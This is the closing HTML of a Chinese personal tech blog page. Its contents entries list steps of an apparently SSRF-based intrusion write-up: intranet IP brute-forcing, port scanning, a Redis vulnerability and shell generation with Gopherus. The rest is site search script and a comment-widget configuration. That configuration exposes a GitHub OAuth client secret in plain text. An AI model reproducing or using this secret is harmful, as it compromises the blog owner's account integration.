+          4. 代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%88%86%E7%A0%B4%E5%86%85%E7%BD%91IP"><span class="toc-number">5.</span> <span class="toc-text">
+          5. 爆破内网IP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3"><span class="toc-number">6.</span> <span class="toc-text">
+          6. 扫描端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-redis%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">
+          7. redis漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-gopherus%E5%88%B6%E9%80%A0shell"><span class="toc-number">8.</span> <span class="toc-text">
+          8. gopherus制造shell</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/logo.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">Sculptor</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/Sculptor-liu/" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://blog.csdn.net/weixin_45798017" target="_blank" rel="noopener" data-popover="social.csdn" data-popover-pos="up"><span class="sidebar-ov-social-item__icon">csdn</span></a></div><div class="sidebar-ov-feed"><span class="sidebar-ov-feed-email"><a class="sidebar-ov-feed-email__link" href="https://mail.qq.com/" target="_blank" rel="noopener"><span class="sidebar-ov-feed-email__icon"><i class="fas fa-envelope"></i></span><span>Email 订阅</span></a></span></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">72</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">7</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">49</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-cn" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Sculptor</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.1.1</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.1.1</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.xml';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/js-md5@latest/src/md5.min.js"></script><script>function loadGitalk () {
+  if (!document.getElementById('gitalk-container')) {
+    return;
+  }
+
+  var gitalk = new Gitalk({
+    id: md5(window.location.pathname.slice(1)),
+    clientID: '28f6b94423100cc8a01d',
+    clientSecret: '812ec412a6abb31e41feedc3fa3ba97eefa1a882',
+    repo: 'Sculptor-liu.github.io',
+    owner: 'Sculptor-liu',
+    admin: ['Sculptor-liu'],
+    distractionFreeMode: 'false',
+    language: 'zh-CN'
+  });
+  gitalk.render('gitalk-container');
+}
+
+if (false) {
+  loadGitalk();
+} else {
+  window.addEventListener('DOMContentLoaded', loadGitalk, false);
+}</script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script src="/js/sidebar.js?v=2.1.1"></script><script type="application/json" src="/search.xml"></script></body></html>
